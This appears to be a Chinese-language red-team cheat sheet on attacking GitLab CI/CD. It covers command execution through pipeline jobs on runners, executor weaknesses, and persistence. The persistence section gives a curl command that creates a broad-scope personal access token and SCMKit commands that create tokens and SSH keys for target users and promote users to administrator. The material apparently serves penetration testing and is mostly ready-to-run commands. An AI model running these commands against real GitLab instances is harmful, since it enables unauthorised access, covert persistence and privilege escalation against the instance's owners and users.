# CI/CD - GitLab CI

GitLab CI (持续集成) 是 GitLab 的一个内置功能，它可以在你每次进行更改时自动执行构建、测试和部署代码的过程。它是 GitLab CI/CD 的一部分，CI/CD 代表持续集成 / 持续部署 (Continuous Integration / Continuous Deployment)。

## GitLab Runner

```ps1
sudo apt-get install gitlab-runner
sudo gitlab-runner register
```

| 提示 (Prompt)            | 示例输入 (Example Input)                                    |
| ------------------- | -------------------------------------------------------- |
| GitLab 实例 URL      | `https://gitlab.com/`                                    |
| 注册令牌 (Registration token) | 在你的项目中的 `Settings > CI/CD > Runners` 下找到 |
| 执行器 (Executor)    | `shell`, `docker` 等                                     |
| 描述 (Description)   | `my-remote-runner`                                       |
| 标签 (Tags)          | `remote`                                                 |

`.gitlab-ci.yml` 文件是 GitLab CI/CD 用于定义流水线、作业和阶段的配置文件。

### 命令执行作业 (Command Execution Jobs)

GitLab-CI "命令执行" 示例：`.gitlab-ci.yml`

```yaml
stages:
    - test

test:
    stage: test
    script:
        - |
            whoami
    parallel:
        matrix:
            - RUNNER: VM1
            - RUNNER: VM2
            - RUNNER: VM3
    tags:
        - ${RUNNER}
```

### 列出 GitLab Runner

列出 GitLab 中当前用户可用的所有 GitLab Runner。

```ps1
SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local
SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local
```

## GitLab 执行器 (GitLab Executors)

* **Shell** 执行器：作业以 GitLab Runner 用户的权限运行，并且可以窃取在该服务器上运行的其他项目的代码。
* **Docker** 执行器：在非特权模式下运行时，Docker 可被认为是安全的。
* **SSH** 执行器：SSH 执行器由于缺少 `StrictHostKeyChecking` 选项，容易受到中间人攻击 (MITM)。

## GitLab CI/CD 变量 (GitLab CI/CD Variables)

CI/CD 变量是在 CI/CD 流水线中存储和使用数据的一种便捷方式，但变量的安全性低于密钥管理服务提供商。

## 权限维持 (Persistence)

* [xforcered/SCMKit](https://github.com/xforcered/SCMKit) - 源码管理攻击工具包 (Source Code Management Attack Toolkit)。

### 个人访问令牌 (Personal Access Token)

创建一个 PAT (个人访问令牌) 作为 GitLab 实例的权限维持机制。

* 手动操作

    ```ps1
    curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
    ```

* 使用 `SCMKit.exe`：创建/列出/删除用于特定 SCM 系统的访问令牌

    ```ps1
    SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID
    SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser
    SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser
    ```

* 获取特定 SCM 系统中正使用的访问令牌所分配的权限

    ```ps1
    SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local
    ```

### SSH 密钥 (SSH Keys)

* 创建/列出用于特定 SCM 系统的 SSH 密钥

    ```ps1
    SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local
    SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local
    SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID
    SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID
    ```

### 用户提升 (User Promotion)

* 在特定的 SCM 系统中将普通用户提升为管理员角色

    ```ps1
    SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    ```

## 工具 (Tools)

* [praetorian-inc/glato](https://github.com/praetorian-inc/glato) - GitLab 攻击工具包 (GitLab Attack TOolkit)。

## 参考资料 (References)

* [Security for self-managed runners - Gitlab](https://docs.gitlab.com/runner/security/)
